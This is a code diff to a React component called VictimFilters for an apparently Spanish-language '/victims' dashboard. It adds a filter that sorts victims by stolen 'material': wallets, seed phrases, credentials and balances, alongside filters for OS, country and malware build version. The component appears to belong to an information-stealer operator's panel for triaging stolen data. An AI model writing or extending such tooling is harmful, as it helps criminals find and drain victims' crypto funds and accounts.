@@ -24,6 +24,7 @@ export function VictimFilters({
   const [country, setCountry] = useState(params.get('country') ?? '');
   const [tag, setTag] = useState(params.get('tag') ?? '');
   const [build, setBuild] = useState(params.get('build') ?? '');
+  const [has, setHas] = useState(params.get('has') ?? '');
 
   useEffect(() => {
     const next = new URLSearchParams(params.toString());
@@ -33,11 +34,12 @@ export function VictimFilters({
     if (country) next.set('country', country); else next.delete('country');
     if (tag) next.set('tag', tag); else next.delete('tag');
     if (build) next.set('build', build); else next.delete('build');
+    if (has) next.set('has', has); else next.delete('has');
     router.replace(`/victims?${next.toString()}`, { scroll: false });
-  }, [debounced, os, status, country, tag, build]); // eslint-disable-line react-hooks/exhaustive-deps
+  }, [debounced, os, status, country, tag, build, has]); // eslint-disable-line react-hooks/exhaustive-deps
 
-  const active = Boolean(q || os || status || country || tag || build);
-  const clear = () => { setQ(''); setOs(''); setStatus(''); setCountry(''); setTag(''); setBuild(''); };
+  const active = Boolean(q || os || status || country || tag || build || has);
+  const clear = () => { setQ(''); setOs(''); setStatus(''); setCountry(''); setTag(''); setBuild(''); setHas(''); };
 
   return (
     <div className="flex flex-wrap items-center gap-1.5 border-b border-line px-3 py-1.5">
@@ -74,6 +76,13 @@ export function VictimFilters({
       <Select value={build} onChange={(event) => setBuild(event.target.value)} aria-label="Build" className="h-7">
         <option value="">cualquier build</option>
         {builds.map((item) => <option key={item.id} value={item.id}>{item.name} v{item.version}</option>)}
+      </Select>
+      <Select value={has} onChange={(event) => setHas(event.target.value)} aria-label="Material" className="h-7">
+        <option value="">cualquier material</option>
+        <option value="wallets">con wallets</option>
+        <option value="seeds">con seeds</option>
+        <option value="creds">con credenciales</option>
+        <option value="balances">con balance</option>
       </Select>
       {active ? (
         <Button variant="ghost" size="sm" onClick={clear}><X className="h-3 w-3" /> limpiar</Button>
